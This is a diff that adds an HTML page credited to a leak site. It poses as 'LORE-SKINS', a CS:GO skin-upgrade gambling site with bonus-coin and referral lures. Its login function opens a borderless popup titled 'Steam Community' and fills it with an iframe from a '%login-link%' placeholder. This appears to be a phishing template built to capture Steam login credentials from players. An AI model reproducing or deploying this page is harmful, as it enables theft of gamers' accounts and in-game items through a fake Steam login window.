@@ -1,0 +1,78 @@
+<!--
+
+Слит сайтом WebStudio.PW
+vk.com/qu1kgg - вк
+vk.com/ws_pw - группа вк
+WebStudio.PW - сайт
+Trade.WebStudio.PW - поддержать меня
+--> 
+<!DOCTYPE xhtml>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>LORE-SKINS - Upgrade your CS:GO skins in our games!</title>
+    <link rel="stylesheet" href="template-4/css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="template-4/img/favicon.ico" type="image/x-icon">
+    <script type="text/javascript" src="template-4/js/jquery-3.2.1.min.js"></script>
+</head>
+
+<body style="">
+    <audio src="template-4/audio/1.mp3" autoplay="autoplay"></audio>
+    <div id="preloader">
+        <img src="template-4/img/bonus.gif">
+    </div>
+    <div id="content">
+        <div id="content-inner">
+            <div id="logo">
+                <div id="logo_img"></div>
+                <div id="domain_wrapper"><span id="domain_name">LORE-SKINS.</span><span id="domain_zone">COM</span></div>
+                <div id="under-domain">Only honest winnings!</div>
+            </div>
+            <div id="info">
+                <div id="bonus" class="info-block">
+                    <div class="info-block_img" id="bonus_img"></div>
+                    <div class="info-block_descr">• Daily <b>distribution</b><br> of coins</div>
+                </div>
+                <div id="distributions" class="info-block">
+                    <div class="info-block_img" id="distributions_img"></div>
+                    <div class="info-block_descr">• When you register,<br>you get a bonus of<br><b>1000 coins</b></div>
+                </div>
+                <div id="ref-system" class="info-block">
+                    <div class="info-block_img" id="ref-system_img"></div>
+                    <div class="info-block_descr">• We have a <b>profitable</b><br>referral system</div>
+                </div>
+            </div>
+            <div id="button_block">
+                <span>To log on to LORE-SKINS you need to agree to our <a href="/rules">ToS</a> and acknowledge that you are at least 18 years old.</span>
+                <div id="button_eng" onclick="login()"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+    $(document).ready(function() {
+        setTimeout(
+            function() {
+                $("#preloader").animate({ opacity: 0 },
+                    500,
+                    function() { setTimeout($("#preloader").css("display", "none"), 500) }
+                );
+            },
+            2500
+        );
+    });
+    </script>
+    <script>
+    function login() {
+        var win = window.open("", "", "STATUS=NO, TOOLBAR=NO, LOCATION=0, DIRECTORIES=0, RESISABLE=NO, SCROLLBARS=YES, TOP=50, LEFT=50, WIDTH=1000, HEIGHT=1000");
+        var content = "<style>body {margin: 0; overflow: hidden;} iframe {height: 100%; width: 100%; border: 0;}</style>";
+        content += "<title>Steam Community</title>";
+        content += "<script> function closeWnd(){ setTimeout(function(){window.close();},0); } <\/script>";
+        var link = "%login-link%"
+        content += "<iframe src=" + link + "></iframe>";
+        win.document.write(content);
+    }
+    </script>
+</body>
+</html>
